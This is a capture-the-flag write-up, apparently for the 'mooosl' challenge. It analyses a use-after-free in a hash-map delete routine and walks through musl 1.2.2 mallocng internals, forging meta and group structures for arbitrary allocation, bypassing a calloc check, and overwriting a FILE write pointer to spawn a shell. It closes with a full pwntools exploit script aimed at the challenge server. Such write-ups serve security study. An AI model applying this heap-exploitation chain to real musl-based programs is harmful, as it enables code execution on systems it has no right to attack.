**What can we do with musl lib 1.2.2:**  

# 0x01 Analyze
Node节点结构：
```
struct Node
{
  void *key;
  void *content;
  __int64 key_size;
  __int64 content_size;
  __int64 hash;
  Node *next_ptr;
};
```
删除操作：
```
unsigned __int64 delete()
{
  void *v1; // [rsp+8h] [rbp-28h] BYREF
  Node **now_ptr; // [rsp+10h] [rbp-20h]
  __int64 v3; // [rsp+18h] [rbp-18h]
  Node *ptr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v1 = 0LL;
  v3 = get_key(&v1);
  ptr = (Node *)find_node(v1, v3);
  if ( ptr )
  {
    now_ptr = (Node **)&hashmap[ptr->hash & 0xFFF];
    if ( ptr == *now_ptr || ptr->next_ptr )     // UAF
    {
      while ( ptr != *now_ptr )
        now_ptr = &(*now_ptr)->next_ptr;        // unlink
      *now_ptr = ptr->next_ptr;
    }
    free(ptr->key);
    free(ptr->content);
    free(ptr);
    puts("ok");
  }
  else
  {
    puts("err");
  }
  free(v1);
  return v5 - __readfsqword(0x28u);
}
```
在程序查找到准确位置并delete节点时，本应从now_ptr->next_ptr开始判断，却直接判断了ptr->next_ptr,导致可以绕过删除操作进行UAF：  
当A/B存在hash碰撞，B->A->NULL , 此时删除A，判断时A->next_ptr为NULL，进行了free却未进行删除，造成了UAF
# 0x02 Exploit
## Malloc at anywhere
首先能确定的是，如果能将一个释放的Node结构重新分配为value，就可以覆写整个Node结构，就可以利用UAF进行任意地址free，但是程序本身保护全开，且musl本身没有设计__malloc_hook和__free_hook, 所以我们需要能将任意地址free变成任意地址分配，通过改写stdin/stdout/stderr结构来完成漏洞利用  
musl从1.2.2版本开始，放弃了之前的分配算法，新的分配方法在/src/malloc/mallocng中  
这里整体上通过一个group和meta结构对堆进行管理，堆块本身并不存储指针  
```
struct group {
  struct meta *meta;
  unsigned char active_idx:5;
  char pad[UNIT - sizeof(struct meta *) - 1];
  unsigned char storage[];
};

struct meta {
  struct meta *prev, *next;
  struct group *mem;
  volatile int avail_mask, freed_mask;
  uintptr_t last_idx:5;
  uintptr_t freeable:1;
  uintptr_t sizeclass:6;
  uintptr_t maplen:8*sizeof(uintptr_t)-12;
};
```
先关注一下free流程：
```
void free(void *p)
{
  if (!p) return;

  struct meta *g = get_meta(p);
  int idx = get_slot_index(p);
  size_t stride = get_stride(g);
  unsigned char *start = g->mem->storage + stride*idx;
  unsigned char *end = start + stride - IB;
  get_nominal_size(p, end);
  uint32_t self = 1u<<idx, all = (2u<<g->last_idx)-1;
  ((unsigned char *)p)[-3] = 255;
  // invalidate offset to group header, and cycle offset of
  // used region within slot if current offset is zero.
  *(uint16_t *)((char *)p-2) = 0;

  // release any whole pages contained in the slot to be freed
  // unless it's a single-slot group that will be unmapped.
  if (((uintptr_t)(start-1) ^ (uintptr_t)end) >= 2*PGSZ && g->last_idx) {
    unsigned char *base = start + (-(uintptr_t)start & (PGSZ-1));
    size_t len = (end-base) & -PGSZ;
    if (len) madvise(base, len, MADV_FREE);
  }

  // atomic free without locking if this is neither first or last slot
  for (;;) {
    uint32_t freed = g->freed_mask;
    uint32_t avail = g->avail_mask;
    uint32_t mask = freed | avail;
    assert(!(mask&self));
    if (!freed || mask+self==all) break;
    if (!MT)
      g->freed_mask = freed+self;
    else if (a_cas(&g->freed_mask, freed, freed+self)!=freed)
      continue;
    return;
  }

  wrlock();
  struct mapinfo mi = nontrivial_free(g, idx);
  unlock();
  if (mi.len) munmap(mi.base, mi.len);
}
```
在每一个chunk中，会在header使用一个位置代表index，表示当前chunk在其group中的位置(每一个chunk分配在group的storage结构中)，而在group中，存在meta成员指向此group对应的meta，并在meta中使用mem指向其对应的group结构，利用这种指向关系，在free时查找到chunk对应的meta和group，并进行check，逻辑写在get_meta函数中：
```
static inline struct meta *get_meta(const unsigned char *p)
{
  assert(!((uintptr_t)p & 15));
  int offset = *(const uint16_t *)(p - 2);
  int index = get_slot_index(p);
  if (p[-4]) {
    assert(!offset);
    offset = *(uint32_t *)(p - 8);
    assert(offset > 0xffff);
  }
  const struct group *base = (const void *)(p - UNIT*offset - UNIT);
  const struct meta *meta = base->meta;
  assert(meta->mem == base);
  assert(index <= meta->last_idx);
  assert(!(meta->avail_mask & (1u<<index)));
  assert(!(meta->freed_mask & (1u<<index)));
  const struct meta_area *area = (void *)((uintptr_t)meta & -4096);
  assert(area->check == ctx.secret);
  if (meta->sizeclass < 48) {
    assert(offset >= size_classes[meta->sizeclass]*index);
    assert(offset < size_classes[meta->sizeclass]*(index+1));
  } else {
    assert(meta->sizeclass == 63);
  }
  if (meta->maplen) {
    assert(offset <= meta->maplen*4096UL/UNIT - 1);
  }
  return (struct meta *)meta;
}
```
这里要注意一个特殊的check，在每个meta结构的页开始位置：meta & -4096，会存放一个meta_area结构：
```
struct meta_area {
  uint64_t check;
  struct meta_area *next;
  int nslots;
  struct meta slots[];
};
```
这里会对其中的check成员进行检测，这里是一个随机cookie，会将其与ctx结构中的secret进行比较，ctx类似libc中全局的main_arena,是一个总的堆管理结构：
```
struct malloc_context {
  uint64_t secret;
#ifndef PAGESIZE
  size_t pagesize;
#endif
  int init_done;
  unsigned mmap_counter;
  struct meta *free_meta_head;
  struct meta *avail_meta;
  size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;
  struct meta_area *meta_area_head, *meta_area_tail;
  unsigned char *avail_meta_areas;
  struct meta *active[48];
  size_t usage_by_class[48];
  uint8_t unmap_seq[32], bounces[32];
  uint8_t seq;
  uintptr_t brk;
};
```
接着回到free操作，下面都是一些简单的对chunk头的check，可以直接绕过，我们注意到在free时可以进入nontrivial_free函数：
```
static struct mapinfo nontrivial_free(struct meta *g, int i)
{
  uint32_t self = 1u<<i;
  int sc = g->sizeclass;
  uint32_t mask = g->freed_mask | g->avail_mask;

  if (mask+self == (2u<<g->last_idx)-1 && okay_to_free(g)) {
    // any multi-slot group is necessarily on an active list
    // here, but single-slot groups might or might not be.
    if (g->next) {
      assert(sc < 48);
      int activate_new = (ctx.active[sc]==g);
      dequeue(&ctx.active[sc], g);
      if (activate_new && ctx.active[sc])
        activate_group(ctx.active[sc]);
    }
    return free_group(g);
  } else if (!mask) {
    assert(sc < 48);
    // might still be active if there were no allocations
    // after last available slot was taken.
    if (ctx.active[sc] != g) {
      queue(&ctx.active[sc], g);
    }
  }
  a_or(&g->freed_mask, self);
  return (struct mapinfo){ 0 };
}
```
可以看到当条件合适，会进入queue和dequeue中，可以理解为将group标记待分配 / 将其free，不再从中分配。  
如果我们伪造一个合适的meta，就可以进入到queue的流程，将其加入到待分配队列中
分配时，在malloc中：
```
void *malloc(size_t n)
{
  ......
  sc = size_to_class(n);
  rdlock();
  g = ctx.active[sc];
        ......
  idx = alloc_slot(sc, n);
  if (idx < 0) {
    unlock();
    return 0;
  }
  g = ctx.active[sc];

success:
  ctr = ctx.mmap_counter;
  unlock();
  return enframe(g, idx, n, ctr);
}
static inline void *enframe(struct meta *g, int idx, size_t n, int ctr)
{
  size_t stride = get_stride(g);
  size_t slack = (stride-IB-n)/UNIT;
  unsigned char *p = g->mem->storage + stride*idx;
  unsigned char *end = p+stride-IB;
  // cycle offset within slot to increase interval to address
  // reuse, facilitate trapping double-free.
  int off = (p[-3] ? *(uint16_t *)(p-2) + 1 : ctr) & 255;
  assert(!p[-4]);
  if (off > slack) {
    size_t m = slack;
    m |= m>>1; m |= m>>2; m |= m>>4;
    off &= m;
    if (off > slack) off -= slack+1;
    assert(off <= slack);
  }
  if (off) {
    // store offset in unused header at offset zero
    // if enframing at non-zero offset.
    *(uint16_t *)(p-2) = off;
    p[-3] = 7<<5;
    p += UNIT*off;
    // for nonzero offset there is no permanent check
    // byte, so make one.
    p[-4] = 0;
  }
  *(uint16_t *)(p-2) = (size_t)(p-g->mem->storage)/UNIT;
  p[-3] = idx;
  set_size(p, end, n);
  return p;
}
```
主要逻辑就是根据请求的size大小对应到ctx.active[sc]中的meta结构，而后分配meta对应的group中的storage的chunk并设置size位。  
**综上，我们通过伪造一个group和meta结构，在绕过free的check时进入queue位置，将可控的meta加入到ctx.active中，而后通过修改meta的group指针指向一个所需位置，在分配时即可进行任意地址分配。**
## LEAK
在调试中发现，由于分配的特性，没有FIFO这种操作，而是按照地址高低进行直接分配  
所以我们需要先获得一个address(value) < address(Node),这样的Node，才可以在free这个Node之后，在进行UAF分配时，先分配value的位置，这样只需要这个value是0x30大小，就可以占位为另一个Node，而且在query输出时：
```
unsigned __int64 query()
{
  ......
  ptr = 0LL;
  v2 = get_key(&ptr);
  v3 = (Node *)find_node(ptr, v2);
  if ( v3 )
  {
    do_show((__int64)v3->content, v3->content_size);
    puts("ok");
  }
  ......
```
是按照content_size进行hex输出，所以不用担心00截断，可以同时leak一个ELF和一个libc附近的Heap地址（调试发现，这些Heap地址和ELF/libc地址偏移固定）  
正常分配时：address(value) 一定大于 address(Node)（顺序分配，在add操作时先calloc Node位置）  
但是同样的libc下，在ubuntu 18.04系统中可以直接在第一次获得这样的Node，但是在Ubuntu 21.04中却不行，所以判断在进行Heap初始化时与系统本身有关。远程系统为Ubuntu 21.04，所以我们直接在21.04中进行bypass，可以注意到在21.04中，最初分配0x30大小的chunk会分配到libc地址附近（0x7F开头的地址），因此我选择进行一次小的堆喷，耗尽高地址的group，这样在一个恰好的位置，就可以满足：分配Node时仍然在高地址，分配value时却因为需要新的group，将其分配到了0x55/56开头的ELF附近的Heap地址，这样就得到了满足上述条件的Node，就可以在UAF时使用Node结构体占位value，leak地址。  
**leak地址之后使用同样的方法用value占位Node，就可以改写Node中的value指针来进任意地址读，以便获取ctx中的secret，才能完成free中的绕过，进行任意地址free => 任意地址malloc**
## GET RCE
看到程序存在退出功能，在exit时：
```
struct _IO_FILE {
  unsigned flags;
  unsigned char *rpos, *rend;
  int (*close)(FILE *);
  unsigned char *wend, *wpos;
  unsigned char *mustbezero_1;
  unsigned char *wbase;
  size_t (*read)(FILE *, unsigned char *, size_t);
  size_t (*write)(FILE *, const unsigned char *, size_t);
  off_t (*seek)(FILE *, off_t, int);
  unsigned char *buf;
  size_t buf_size;
  FILE *prev, *next;
  int fd;
  int pipe_pid;
  long lockcount;
  int mode;
  volatile int lock;
  int lbf;
  void *cookie;
  off_t off;
  char *getln_buf;
  void *mustbezero_2;
  unsigned char *shend;
  off_t shlim, shcnt;
  FILE *prev_locked, *next_locked;
  struct __locale_struct *locale;
};

_Noreturn void exit(int code)
{
  __funcs_on_exit();
  __libc_exit_fini();
  __stdio_exit();
  _Exit(code);
}

void __stdio_exit(void)
{
  FILE *f;
  for (f=*__ofl_lock(); f; f=f->next) close_file(f);
  close_file(__stdin_used);
  close_file(__stdout_used);
  close_file(__stderr_used);
}

static void close_file(FILE *f)
{
  if (!f) return;
  FFINALLOCK(f);
  if (f->wpos != f->wbase) f->write(f, 0, 0);
  if (f->rpos != f->rend) f->seek(f, f->rpos-f->rend, SEEK_CUR);
}
```
可以看到FILE结构体中存在read/write/seek指针  
并且在最终close_file时，FILE条件合适就可以触发f->write  
所以只需要任意地址分配到stdin/stderr，并构造：f->wpos != f->wbase，将f->write指向system，并在FILE开始位置设置为字符串"/bin/sh\x00"即可在exit时get shell
## Calloc Check
这里在ida中比较清晰，注意到calloc在调用malloc后：
```
char *__fastcall calloc(unsigned __int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r12
  char *v3; // rbp
  char *v4; // rdi
  char *v5; // rdx
  __int64 v6; // rax

  if ( a2 && !is_mul_ok(a2, a1) )
  {
    v3 = 0LL;
    *(_DWORD *)_errno_location(a2, a2, (a2 * (unsigned __int128)a1) >> 64) = 12;
    return v3;
  }
  v2 = a2 * a1;
  v3 = (char *)malloc(a2 * a1);
  if ( !v3 || !flag_check && (unsigned int)get_meta_check((__int64)v3) )
    return v3;
  if ( v2 > 0xFFF )
```
会根据一个flag_check位决定当前分配机制是否为old/new，若是新的机制，会在后续利用get_meta对整个chunk的合法性进行check，若要进行任意地址分配，就必须在malloc后绕过这个check  
这里注意到malloc后会对分配chunk的header进行设置：
```
    *(uint16_t *)(p-2) = (size_t)(p-g->mem->storage)/UNIT;
    p[-3] = idx;
    set_size(p, end, n);
    return p;
```
所以在分配到stdin前，我们可以先分配chunk到这个flag_check位置，利用malloc中的set_size将其设置为非0，这样在malloc返回进入calloc时就会关闭check。  
**到此，便绕过了所有check并布置好stdin，最后触发exit功能get shell即可**
### 0x03 EXP
```
from pwn import *

context.log_level="debug"

def cmd1(note):
   p.sendlineafter(b"option: ",str(note).encode())

def cmd2(note):
   p.sendlineafter(b": ",str(note).encode())

def cmd3(note):
   p.sendafter(b": ",note)

def add(k_size,k_note,v_size,v_note):
  cmd1(1)
  cmd2(k_size)
  cmd3(k_note)
  cmd2(v_size)
  cmd3(v_note)

def query(k_size,k_note):
  cmd1(2)
  cmd2(k_size)
  cmd3(k_note)

def delete(k_size,k_note):
   cmd1(3)
   cmd2(k_size)
   cmd3(k_note)

#p=process("./mooosl")
p=remote("mooosl.challenges.ooo",23333)
#malloc: struct key value
#free: key value 
for i in range(9):
   add(0x30,b"123456\n",0x30,b"aaaa\n")
   
#gdb.attach(p)
add(0x30,b"\x00\n",0x30,b"aaaaaaaaaaaaaaaa\n")
add(0x30,b"abHU\n",0x30,b"aaaaaaaa\n")
add(0x30,b"a\n",0x30,b"aaaa\n")
delete(0x30,b"\x00\n")#0x7ffff7ffeca0 0x7ffff7ffece0 0x7ffff7ffec60
delete(0x30,b"a\n")

query(0x30, b"\x00\n")

add(0x10,b"1\n",0x50,b"abcd\n")

query(0x30,b"\x00\n")

p.recvuntil(b"0x10:")
heap=u64(bytes.fromhex(p.recv(16).decode()))
libc=u64(bytes.fromhex(p.recv(16).decode()))-0x7ffff7ffe080+0x7ffff7f47000
print(hex(heap),hex(libc))



add(0x20,b"\x01\n",0x20,b"bbbbbbbb\n")
add(0x20,b"abHV\n",0x20,b"bbbbbbbb\n")
#gdb.attach(p)
fake_note = p64(libc-0x7ffff7f47000+0x00007ffff7ffe270)+p64(libc-0x7ffff7f47000+0x7FFFF7FFBAC0)+p64(1)+p64(8)+p64(0xb4c061d6)+p64(0)[:7]+b"\n"
delete(0x20,b"\x01\n")#0x555555561f40

add(0x30,b"111111\n",0x30,fake_note)
add(0x30,b"222222\n",0x30,b"bbbbbb\n")

add(0x20,b"aaaa\n",0x20,b"aaaa\n")
add(0x20,b"aaaa\n",0x20,b"aaaa\n")
add(0x20,b"aaaa\n",0x20,b"\x01\n")

query(0x20,b"\x01\n")
p.recvuntil(b"0x8:")
cookie=u64(bytes.fromhex(p.recv(16).decode()))
print(hex(cookie))

delete(0x30,b"111111\n")

fake_note = p64(libc-0x7ffff7f47000+0x00007ffff7ffe270)+p64(libc-0x1000+0x60)+p64(1)+p64(8)+p64(0xb4c061d6)+p64(0)[:7]+b"\n"
add(0x30,b"3333\n",0x30,fake_note)

fake_marena = p64(cookie) + p64(0)
fake_mem=p64(0)+p64(0)+p64(libc-0x1000+0x40)+p64(0)+p64(0x362)+p64(0)
fake_group=p64(libc-0x1000+0x10)+p64(0x0001e00000000002)+p64(heap-0x555555560c60+0x555555562890)+p64(0x0001a00000000000)

#gdb.attach(p)

add(0x20,b"12\n",0x800,b"aaaa\n")
add(0x20,b"13\n",0x800,b"3"*(0x2000-0x1ac0)+fake_marena+fake_mem+fake_group+b"\x00"*0x120+p64(0)+p64(0x0002c)+b"\n")#libc-0x7ffff7f47000+0x7ffff7f41ac0
#fake_mem=p64(0)+p64(0)+p64(0x555555562880)+p64(0)+p64(0x1)+p64(0)
#fake_group=p64(0x555555562850)+p64(0x0000c00000000000)+p64(0x555555562890)+p64(0x0001a00000000002)
#add(0x20,"aaaa\n",0x1000,"11111111\n")]';,,
#gdb.attach(p)

#add(0x20,"a1\n",0x100,"44444444\n")
#add(0x20,"a2\n",0x100,"44444444\n")

fake_mem=p64(libc-0x1000+0x10)+p64(libc-0x1000+0x10)+p64(libc-0x7ffff7f47000+0x7FFFF7FFDF80-8)+p64(0x0000000100000000)+p64(0x362)+p64(0)


delete(0x20,b"\x01\n")

delete(0x20,b"13\n")
add(0x20,b"13\n",0x800,b"3"*(0x2000-0x1ac0)+b"aaaa\n")
add(0x20,b"14\n",0x800,b"3"*(0x2000-0x1ac0-0x10)+fake_marena+fake_mem+fake_group+b"\x00"*0x120+p64(0)+p64(0x0002c)+b"\n")
#gdb.attach(p)
add(0x20,b"a2\n",0x100,b"44444444\n")

delete(0x20,b"14\n")
fake_mem=p64(libc-0x1000+0x10)+p64(libc-0x1000+0x10)+p64(libc-0x7ffff7f47000+0x7ffff7ffb110)+p64(0x0000000100000000)+p64(0x362)+p64(0)

add(0x20,b"14\n",0x800,b"3"*(0x2000-0x1ac0-0x10-0x10)+fake_marena+fake_mem+fake_group+b"\x00"*0x120+p64(0)+p64(0x0002c)+b"\n")

#gdb.attach(p)
payload  = b"/bin/sh\x00"+p64(0)*6+p64(1)+p64(0) +p64(libc-0x7ffff7f47000+0x7ffff7f97a90) 

add(0x20,b"a2\n",0x100,b"4"*0x50+payload+b"\n")
cmd1(4)

p.interactive()
```
